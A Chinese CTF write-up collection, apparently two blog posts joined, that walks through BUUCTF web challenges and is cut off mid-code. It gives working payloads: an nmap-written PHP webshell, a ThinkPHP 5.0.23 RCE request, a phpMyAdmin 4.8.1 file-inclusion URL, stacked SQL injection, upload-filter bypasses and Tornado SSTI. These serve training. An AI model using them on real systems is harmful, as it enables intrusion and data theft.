法二：使用16进制绕过对于%00出现的属性，只需要将变量名前的小写的s改成大写的S，即可将变量名用16进制表示。 12如：s:11:'%00*%00filename';表示为：S:11:'\\x00*\\x00filename'; [BUUCTF 2018]Online Tool打开题目得源码： 123456789101112131415161718&lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];}if(!isset($_GET['host'])) { highlight_file(__FILE__);} else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);} 命令执行题，本题关键是得绕过escapeshellarg与escapeshellcmd。 关键点再与此处连续套用了转义函数，导致出现了由此产生的bypass绕过方法。 对于$host=a'b来说 123escapeshellarg转义后为：'a\\'''b'而后经escapeshellcmd转义后为: 'a\\\\'''b'如此以来片会造成引号的逃离 EXP： 1?host=' &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG evil.php ' Nmap中-oG参数也将输出结果写入文件，我们利用此来写入一个webshell。 然后用蚁剑等webshell管理工具连接读取flag即可。 [GYCTF2020]Blacklist强网杯随便注魔改题。 考点：handler代替select查询。 mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 123456handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名handler yunensec read first; #读取指定表/句柄的首行数据handler yunensec read next; #读取指定表/句柄的下一行数据handler yunensec read next; #读取指定表/句柄的下一行数据...handler yunensec close; #关闭句柄 EXP： 11';handler `FlagHere` open as yunensec;handler yunensec read first;# [BJDCTF 2nd]old-hack打开题目，发现页面存在Powered by THINKPHP5的提示。 随便访问一个控制器：/index.php?s=/index/aaaa，在debug页得到tp版本为5.0.23。 Google一下tp5.0.23的漏洞，发现RCE一枚。 123# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debugPOST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al 摘自：https://y4er.com/post/thinkphp5-rce/ [De1CTF 2019]SSRF Me题目给出Hint：flag is in ./flag.txt。 打开题目给出源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#! /usr/bin/env python #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(&quot;/geneSign&quot;, methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route('/De1ta',methods=['GET','POST']) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 考点：MD5长度拓展攻击、local_file协议。 利用长度拓展攻击绕过sign的验证，再利用local_file协议读取文件内容(file协议为封装好的local_file协议)即可，不过直接不填写任何协议直接让param为flag.txt也可以，因为如果不写协议名称默认即为file协议。 由于篇幅限制，这里不进行对hash长度拓展攻击的解读。 [GKCTF2020]cve版签到题目给出提示：cve-2020-7066 通过搜索引擎查找得到如下信息：https://bugs.php.net/bug.php?id=79329 可以看到在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中get_headers函数存在00截断问题。 题目首页告诉了我们： 1You just view *.ctfhub.com 故不能直接输入其他的地址，故我们尝试截断试试让其获取的值为本地IP：127.0.0.1： 可以看到题目返回了PHP版本为7.3.15，00截断问题存在，而后又给出了提示，HOST必须为123，修改或访问得到FLAG： [GXYCTF2019]禁止套娃打开题目，首页显示： 1flag在哪里呢？ 查看源代码以及响应头，均无tips给出 使用direarch扫描文件，得到如下结果： 发现存在.git目录泄露，尝试还有lijiejie的githack脚本还原代码： 1python2 Githack.py http://www.example.com/.git/ 得到文件index.php，源代码如下： 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(&quot;还差一点哦！&quot;); } } else{ die(&quot;再好好想想！&quot;); } } else{ die(&quot;还想读flag，臭弟弟！&quot;); }}// highlight_file(__FILE__);?&gt; 很明显，题目需要我们构造一个无参命令执行payload。 常见的无参构造利用方法如下： getenv()+array_rand()+array_flip()，其中getenv返回包含当前环境信息的数组，array_rand随机返回数组的值，array_flip将数组键值互换。 end(getallheaders()) apache+array_rand()+end()+ger_defined_vars() hex2bin()+session_id()+session_start()，PHPSESSION允许数字与字母出现（部分符号也可，如括号，点号）。 dirname()取目录参数的上一级目录，getcwd()取当前目录，chdir设置当前工作目录。跨目录读取demo：readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));。 readfile(next(array_reverse(scandir(current(localeconv()))))); 摘自：PHP Parametric Function RCE) end() – 将内部指针指向数组中的最后一个元素，并输出 next() – 将内部指针指向数组中的下一个元素，并输出 prev() – 将内部指针指向数组中的上一个元素，并输出 reset() – 将内部指针指向数组中的第一个元素，并输出 each() – 返回当前元素的键名和键值，并将内部指针向前移动 常见数组操作，摘自：w3school 题目关键正则分析：[a-z,_]+\\((?R)?\\) (?R)表示当前正则表达式，也就是[a-z,_]+\\((?R)?\\)本身，故这个表达式本质上类似套娃正则，即： 123[a-z,_]+\\([a-z,_]+\\([a-z,_]+\\([a-z,_]+\\(...\\)\\)\\)\\)能匹配：a(b(c(...))) # 任意个函数的嵌套，注意都是用的函数返回值做参 法一： 法二： 法三： [MRCTF2020]你传你🐎呢经典上传题，.htaccess解析图片即可。 上传包含php代码的文件： 访问即可得到FLAG： 简单总结下上传题经典套路： gif89a文件头、Content-Type: image/jpeg文件类型、上传%00截断文件名 php、php2、php3、php4、php5、phtml、phtm后缀 .htaccess、.user.ini特殊上传，前者要求apache环境后者要求，同目录下需要存在一个php文件 &lt;script language=”php”&gt;、&lt;? ?&gt;、&lt;?= ?&gt;。 [安洵杯 2019]easy_web打开题目，观察到被跳转到了另一个URL： 1index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= img参数有点想base64编码，连续base64解码得到： 13535352e706e6630 注意观察，有数字，有字母，无符号，数字0、3、5、2、7、6，字母e，满足hex的范畴，尝试hex转字符串得： 1555.pnf0 故此题的编码应该为string-&gt;hex-&gt;base64-&gt;base64 尝试读取index.php，img参数为base64_encode(base64_encode(hex2bin('index.php')))： 1/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd= 得index.php源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) { echo '&lt;img src =&quot;./ctf3.jpeg&quot;&gt;'; die(&quot;xixiï½ no flag&quot;);} else { $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src='data:image/gif;base64,&quot; . $txt . &quot;'&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;}echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) { echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;} else { if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (&quot;md5 is funny ~&quot;); }}?&gt;&lt;html&gt;&lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 其中关于： 1(string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b']) 的绕过是老生常谈了，这里对这种md5函数总结一下几种方法： 数组对比，a[]=1&amp;b[]=2，md5($a)=null且md5($b)=null 0e弱比较绕过，s878926199a和s1091221200a `%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2明文不同，MD5相同。 123+ md5($str,true)： content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1’or’8string: T0Do#’or’8 1 content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: ‘or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cstring: ‘or’6]!r,b 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960+ NaN和INF这里我们用第三种办法来绕过即可，而对于命令执行，我们知道，在php中，反引号\\`可以当做系统命令执行，而这里又进行了很多过滤，在之前篇的刷题记录中我有提到命令执行的常见讨论，这里我们使用反斜线\\绕过。在Linux中，反斜线会被省略掉，即`ca\\t`与`cat`相同。故EXP：![image-20200917162459727](https://img.0x002.com/article/BuuCTF3/image-20200917162459727.png)## [MRCTF2020]Ez_bypass打开题目得到如下源代码：```php&lt;?phpinclude 'flag.php';$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo &quot;can you think twice??&quot;; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); }} else { echo &quot;You are not a real hacker!&quot;; }}else{ die('Please input first');}} 简单的md5绕过+弱比较，EXP： 12345POST /?gg[]=1&amp;id[]=2 HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15passwd=1234567a [BJDCTF2020]Mark loves cat打开题目，页面元素过多，感觉没有啥可用的信息。 简单看一下HTML源代码+请求响应头后，就打开direarch开始扫描了： 1python3 direarch.py -u http://x.x.x.x/ -e php,zip -t 1 # BUU请求数限制 扫描器有扫到.git目录，随后打开lijiejie的githack工具，尝试dump下源码。 主要文件index.php: 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude 'flag.php';$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = 'yds';foreach($_POST as $x =&gt; $y){ $$x = $y;}foreach($_GET as $x =&gt; $y){ $$x = $$y;}foreach($_GET as $x =&gt; $y){ if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){ exit($handsome); }}if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){ exit($yds);}if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is);}echo &quot;the flag is: &quot;.$flag; 可用看到开头就有两个变量注册： 1234567foreach($_POST as $x =&gt; $y){ $$x = $y;}foreach($_GET as $x =&gt; $y){ $$x = $$y;} 会把$_GET和$_POST的键名作为变量名，值作为变量值，来组成新的变量。 接着有三段连续的死亡exit，我们不能让我们的payload执行到那里。 1234567891011121314// 批量判断$_GET中是否存在键名与$_GET['flag']的值相同的其他键foreach($_GET as $x =&gt; $y){ if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){ exit($handsome); }}// 判断$_GET['flag']与$_POST['flag']是否存在if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){ exit($yds);}// 判断$_POST['flag']或$_GET['flag']是否为flagif($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is);} 本题的关键是需要满足isset($_GET['flag']) || isset($_POST['flag']的同时，还需满足$_POST['flag'] !== 'flag' &amp;&amp; $_GET['flag'] !== 'flag'。 法一123if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){ exit($yds);} 通过GET方式传递参数yds=flag，使得$yds=$flag，最终执行到上述代码时带出flag的值。 法二1234GET /?_POST=_GET&amp;_GET=_COOKIE HTTP/1.1Host: xxxxx.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Cookie: flag=1 通过覆盖$_POST与$_GET绕来两个死亡exit，通过最终的输出那道flag。 [GWCTF 2019]我有一个数据库从题目猜出应该是与数据库有关的题目，通过扫描工具扫描得出：phpinfo.php与phpmyadmin目录。 访问phpmyadmin，访问直接已经登录好了。在首页处得到phpmyadmin版本：4.8.1。 通过phpinfo可以得到网站运行目录：/var/www/html 尝试直接写出文件，查看secure_file_priv权限，如果为’’则可以写入文件，为NULL则无权限。 再尝试修改日志路径拿shell 报错，提示权限不足。 打开搜索引擎，搜索phpmyadmin 4.8.1之后找到一个phpmyadmin的包含漏洞，详细分析地址：phpmyadmin4.8.1后台GetShell。 用图中的payload直接读取FLAG： 1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag [GXYCTF2019]BabyUpload这题和上边那题MRCTF2020的上传题是一样的，都是上传.httaccess文件后再上传一个jpg文件即可。 注意，这里做了文件头和php内容判断，用GIF89a和&lt;script language='php'&gt;php代码&lt;/script&gt;。 读取根目录的FLAG： 1/upload/0cffff4b7b760870553f87db86cc9953/2.jpg?cmd=highlight_file(%27/flag%27);","link":"/2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E5%9B%9B)%E4%B9%8BBUUCTF/"},{"title":"百道CTF刷题记录(二)之BUUCTF","text":"前言最近好久没刷CTF题了，其实BUUCTF这个平台我也是最开始的用户之一(uid前20，懒狗石锤了…)，可是一直没有时间能够好好的刷题，今儿总算时间充裕，打算花些时日，记录下自己在BUU刷题的经验。 刷题之旅[HCTF 2018]WarmUp打开题目页面，习惯性右键查看HTML源代码： 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--source.php--&gt; &lt;br&gt;&lt;img src=&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg&quot; /&gt;&lt;/body&gt;&lt;/html&gt; 得提示：source.php，访问之~得到源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; // 判断参数是否存在 if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } // 白名单判断 if (in_array($page, $whitelist)) { return true; } // 字符串切割，截取?之前的字符串，若无则不截取 $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') //末尾添加?防止未找到报错 ); // 白名单判断 if (in_array($_page, $whitelist)) { return true; } // Url解码 $_page = urldecode($page); // 再次切割 $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); // 白名单判断 if (in_array($_page, $whitelist)) { return true; } echo &quot;you can't see it&quot;; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 访问source.php?file=hint.php得到提示：flag not here, and flag in ffffllllaaaagggg 本题难点就是得想到如何利用字符串切割绕开白名单判断且能任何文件包含，其实也很简单：source.php?file=hint.php?/../任意文件即可。 EXP: source.php?file=hint.php?/../../../../ffffllllaaaagggg [强网杯 2019]随便注注入题，老规矩，先来个单引号试试： 尝试老套路拼接union select之后发现被拦截了，拦截代码： 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 发现select被禁止了，这种情况下，通常的注入方法，如盲注、报错注入等都在这不好使了。 直接说解法吧，这里是堆叠注入。 爆库：1';show databases;# 1234567891011121314151617181920212223242526272829array(1) { [0]=&gt; string(11) &quot;ctftraining&quot;}array(1) { [0]=&gt; string(18) &quot;information_schema&quot;}array(1) { [0]=&gt; string(5) &quot;mysql&quot;}array(1) { [0]=&gt; string(18) &quot;performance_schema&quot;}array(1) { [0]=&gt; string(9) &quot;supersqli&quot;}array(1) { [0]=&gt; string(4) &quot;test&quot;} 爆表（当前数据库）：1';show tables;# 123456789array(1) { [0]=&gt; string(16) &quot;1919810931114514&quot;}array(1) { [0]=&gt; string(5) &quot;words&quot;} words表应该就是测试数据，也就是该条语句的from接的应该就是words，那么flag应该在1919810931114514表中了。 而select关键字被拦截掉了，如何才能读取数据呢 解法一：handlerEXP： 1231';handler `1919810931114514` open as `yunenctf`;handler `yunenctf` read first;## handler `1919810931114514` open as `yunenctf`; 将数据表载入并将返回句柄重命名# handler `yunenctf` read first; 读取指定句柄的首行数据 解法二：重命名rename此方法有一定的危险性，若操作失败极容易损坏环境，请在公共靶机操作时注意查看payload。 首先查看words表下的字段信息：1'; show columns from words;# 1234567891011121314151617181920212223242526272829array(6) { [0]=&gt; string(2) &quot;id&quot; [1]=&gt; string(7) &quot;int(10)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;}array(6) { [0]=&gt; string(4) &quot;data&quot; [1]=&gt; string(11) &quot;varchar(20)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;} 共有两字段，分别是id与data字段； 查看1919810931114514表的字段信息： 1234567891011121314array(6) { [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;} 只有一个flag字段 EXP： 11'; rename table words to word1; rename table `1919810931114514` to words; alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);# rename table words to word1; 将words表重命名为word1 rename table `1919810931114514` to words; 将 1919810931114514 重命名为words alter table words add id int unsigned not Null auto_increment primary key; 为words表添加id字段并作为主键 alter table words change flag data varchar(100); 将words表的flag字段更名为data 解法三：预编译prepare由于select被拦截，故我们可以选择将select * from `1919810931114514`给转成16进制并存放到变量中，接着进行预编译处理并运行。 EXP： 11';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# [SUCTF 2019]EasySQL这题有点考脑洞的感觉，关键是你得猜出来他的SQL语句是怎么个拼接法。 select $_REQUEST['query']||flag from Flag 怎么猜呢？ 首先我们发现本题无报错信息，且任意非数字开头的输入均无返回。 其次尝试1;show tables;#等payload发现可以返回，堆叠注入存在，但是测试发现from、表名Flag、0x、handler被拦截，看来本题不想让我们能简单地以堆叠注入通过。 尝试输入1,2,3,4，发现返回内容为Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 1 )，可判断出注入位置。 尝试输入1,2,3,0，发现返回内容为Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 0 )，可以判断最后的0应该是被拼接上了||或字符。 解法一：*通过堆叠注入的show tables可以知道，当前执行命令的表即为唯一的Flag表，故flag信息应该也在该表里边。输入*,1即可返回该表的所有字段数据。 EXP：*,1 解法二：pipes_as_concat据说此解才是预期解orz，set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串。 通过将||符号的含义改变成拼接字符串即可带出flag的值（如果是||其他东西就不行了）。 EXP：1;set sql_mode=pipes_as_concat;select 1 [极客大挑战 2019]EasySQLcl4y师傅写的题，出的还算简单，打开题目就亮瞎了我的狗眼，不愧是羽哥哥。 其实这个页面没啥用，真正功能在check.php。随便输入一个数据：check.php?username=1&amp;password=1，提示用户名与密码错误。 老规矩，单双引号与反斜杠走起，尝试单引号时就报错了。 1You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1'' at line 1 通常的登录判断实现有两种方法： 在where语句后拼接username与password，判断是否返回数据的条数，若为0即账号密码错误。 先获取数据库中对于username的密码，再与password参数做比较。 而这里是第一种判断方法，可以通过尝试在username和password单独加单引号，发现都会返回报错信息可以猜测出。 搞懂了这点这题就很简单了，EXP： 1check.php?username=1%27%201%3d1%23&amp;password=2 [护网杯 2018]easy_tornado一看到tornado经常刷题的师傅（老赛棍）就知道了，SSTI必不可少。 打开题目首页映入眼帘的三个跳转链接： /flag.txt/welcome.txt/hints.txt 分别打开得到： flag in /fllllllllllllag render md5(cookie_secret+md5(filename)) 观察URL可以发现：file?filename=/hints.txt&amp;filehash=b40f21b84d8adb13a98b455421e19522 很明显，我们只需要找到cookie_secret就可以读取fllllllllllllag文件获得flag，而这需要通过SSTI获得。 SSTI模板注入位置：error?msg=Error，报错页面。报错页面存在SSTI也是常考点了 老规矩尝试49，发现被拦截了，返回ORZ，把\\*去掉后确实能返回77，说明的确存在SSTI。 经过尝试，发现拦截了_,(),[]等，命令执行的路算被堵死了。 这里的考点就是tornado的handler.settings对象 在tornado中 handler 对象 是指向RequestHandler而RequestHandler.settings又指向self.application.settings所以所有handler.settings就指向RequestHandler.application.settings了！ 而在模板中，handler是可用的，故访问:error?msg={{handler.settings}}，记得得到cookie_secret。 1{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'e23c0c77-a56a-444d-a44b-e74ee6ce5ba5'} 所以/fllllllllllllag对应的hash就为md5(cookie_secret+md5(‘/fllllllllllllag’))，即：c4a22e606c667e494b34c926adbc0a42。 EXP： 1file?filename=/fllllllllllllag&amp;filehash=c4a22e606c667e494b34c926adbc0a42 #此处由于cookie_secret不同需要自己走一遍流程 [极客大挑战 2019]Havefun签到题，无考点。 EXP：/?cat=dog [RoarCTF 2019]Easy Calc打开题目，邮件查看HTML源代码，发现： 12345678910111213141516171819&lt;!--I've set up WAF to ensure security.--&gt;&lt;script&gt; $('#calc').submit(function(){ $.ajax({ url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:'GET', success:function(data){ $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;答案:&lt;/strong&gt;${data} &lt;/div&gt;`); }, error:function(){ alert(&quot;这啥?算不来!&quot;); } }) return false; })&lt;/script&gt; 访问calc.php，得到如下源代码： 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num'])){ show_source(__FILE__);}else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(&quot;what are you want to do?&quot;); } } eval('echo '.$str.';');}?&gt; 可以看到，这是个命令执行题，如何绕过黑名单执行命令是本题的考点。 经过尝试后发现，当num参数传入字母时便会被WAF拦截。这里有两种方法来绕过： 法一：PHP黑魔法%20numPHP在接受请求参数时会忽略开头的空格，也就是说?%20%20num=a相当于$_GET['num']=a的效果。 WAF判断的参数仅是num，而对于%20num他是不做拦截的。 法二：HTTP走私攻击这也是WAF绕过的老法子之一了，用在这里也是正常的操作。 而对于单双引号被过滤的情况如何表示字符串，由于PHP的灵活性有挺多的法子，这里列举两个： 一是利用chr()等转换函数，将ascii码转成单个字符串在用.拼接。 二是利用~取反等符号，如~%9e就代表字符串a。 EXP： 12calc.php?%20num=var_dump(scandir(~%d0)) // 列出根目录下的全部文件名calc.php?%20num=highlight_file(~%D0%99%CE%9E%98%98) // 读flag文件 [极客大挑战 2019]Secret打开题目，啥信息都没有，不清楚考点。老规矩，先查看返回头、HTML源代码，若无结果再开扫描器。 在HTML源代码处发现提示： 1&lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt; 打开/Archive_room.php文件，得： 点击之后发现被跳转到了end.php，易知action.php返回了跳转信息。打开Burpsuite抓取数据包重放得到： 访问之，得PHP源代码一份： 12345678910111213141516&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; // 简单防搅屎措施 if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 很容易就知道此处的考点应该是LFI读文件，EXP： 1secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php 得到Base64编码过的flag.php源代码，解密之即可得flag。 [HCTF 2018]admin这题出的是真的不错，学到了很多东西，多刷好题还是有用的。 打开题目，在首页的HTML源代码处发现注释： 1&lt;!-- you are not admin --&gt; 猜测获取flag需要登录admin账户，我们先注册随便一个账号登录进去看看。 在change_password功能页的HTML源码中发现注释： 1&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt; 这里贴一下主要源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#!/usr/bin/env python# -*- coding:utf-8 -*-from flask import Flask, render_template, url_for, flash, request, redirect, session, make_responsefrom flask_login import logout_user, LoginManager, current_user, login_userfrom app import app, dbfrom config import Configfrom app.models import Userfrom forms import RegisterForm, LoginForm, NewpasswordFormfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprepfrom io import BytesIOfrom code import get_verify_code@app.route('/code')def get_code(): image, code = get_verify_code() # 图片以二进制形式写入 buf = BytesIO() image.save(buf, 'jpeg') buf_str = buf.getvalue() # 把buf_str作为response返回前端，并设置首部字段 response = make_response(buf_str) response.headers['Content-Type'] = 'image/gif' # 将验证码字符串储存在session中 session['image'] = code return response@app.route('/')@app.route('/index')def index(): return render_template('index.html', title = 'hctf')@app.route('/register', methods = 